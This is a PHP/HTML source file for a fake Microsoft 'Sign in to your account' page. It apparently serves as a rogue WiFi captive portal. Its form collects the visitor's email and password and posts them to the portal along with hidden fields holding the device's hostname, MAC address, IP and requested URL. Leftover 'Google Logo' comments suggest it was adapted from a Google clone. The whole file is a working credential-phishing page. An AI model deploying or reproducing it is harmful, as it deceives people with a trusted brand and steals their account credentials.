<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">

        <script type="text/javascript">
          function redirect() {
            setTimeout(function() {
              window.location = "/captiveportal/index.php";
            }, 100);
          }
        </script>

        <title>Sign in to your account</title>
        <!-- JQuery and Bootstrap -->

        <script src='assets/js/jquery-3.4.1.min.js'></script>
        <script src='assets/js/jquery-ui.min.js'></script>
        <link href='assets/css/bootstrap.min.css' rel="stylesheet">
        <script src='assets/js/bootstrap.min.js'></script>
        <link href='assets/css/progress-bar.css' rel="stylesheet">

        <link rel="stylesheet" href="assets/css/custom.css">
        <!-- <script src='assets/js/custom.js' type="text/javascript"></script> -->

        <!-- Set the favicon -->
        <link rel="icon" type="image/png" href="assets/images/favicon.ico">

        <!-- allow the site to be mobile responsive -->
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <style media="screen">

        @font-face {
          font-family: 'Roboto';
          src: URL('assets/fonts/Roboto-Regular.ttf') format('truetype');
          font-weight: normal;
        }

        @font-face {
          font-family: 'open-sans';
          src: URL('assets/fonts/OpenSans-Regular.ttf') format('truetype');
          font-weight: normal;
        }

        </style>
    </head>
    <body style="background: linear-gradient(to right, rgba(0, 0, 0, 63%), rgba(0, 0, 0, 63%)), url(assets/images/2_bc3d32a696895f78c19df6c717586a5d.svg);
    background-position: center center,center center;
    background-size: cover,cover;">
        <div id='login-app'>
            <div class="login-container">
                <!-- progress bar from material.io -->
                <div class='progress-bar-container show-progress'>
                    <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;'>
                        <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
                            <div class="mdc-linear-progress__buffering-dots"></div>
                            <div class="mdc-linear-progress__buffer"></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                        </div>
                    </div>
                </div>
                <div class='login-content' id='login-form'>
                    <!-- Google Logo -->
                    <div id="logo" title="Google">
                    <img class="banner-logo" style="margin-left: 18px;" src="assets/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
                    <!-- /Google Logo -->
                    </div>
                    <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id='email-form-step'>
                        <h1 class='g-h1'>Sign in</h1>
                        <div class='login-content' style="margin-top: -20px;">
                            <div style="display: flex">
                                <input name="email" id='email-input' type="text" class='g-input another-element' placeholder="Email, phone, or Skype"  style="margin-top: -6px;  display: inline-block;" required>
                                <input name="password" id='password-input' type="password" class='pass-element g-input password-input' placeholder="Password" novalidate  style="margin-top: -6px; display: inline-block;" required>
                            </div>
                            
                            
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="target" value="<?=$destination?>">

                            <legend class='g-legend hv' style="font-size: .8125rem; cursor: pointer">Can’t access your account?</legend>
                            <!-- <div class='login-priv'>
                                <p class='p'>Not your computer? Use a Private Window to sign in.</p>
                                <legend class='g-legend'>Learn more</legend>
                            </div> -->
                            <!-- form navigation menu -->
                            <div class='login-nav'>
                                <legend class='g-legend'></legend>
                                <!-- <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div> -->
                                <button id="back" class='gbtn-second' type="button">Back</button>
                                <button id="n" class='gbtn-primary' type="button">Next</button>
                                <button id="myelement" class='gbtn-primary' type="submit">Next</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>
<script type="text/javascript">
$(document).ready(function() {
  $('#password-input').hide();
  $('#myelement').hide();
});

$( "#n" ).click(function() {  
    $('#myelement').show();
    $('#n').hide();   
    $('.another-element').hide("slide", { direction: "left" }, 199); 
    $('.pass-element').show("slide", { direction: "right" }, 199);

});

$( "#back" ).click(function() {   
    $('#myelement').hide();
    $('#n').show();    
    $('.pass-element').hide("slide", { direction: "right" }, 199);
    $('.another-element').show("slide", { direction: "left" }, 199); 
});
</script>
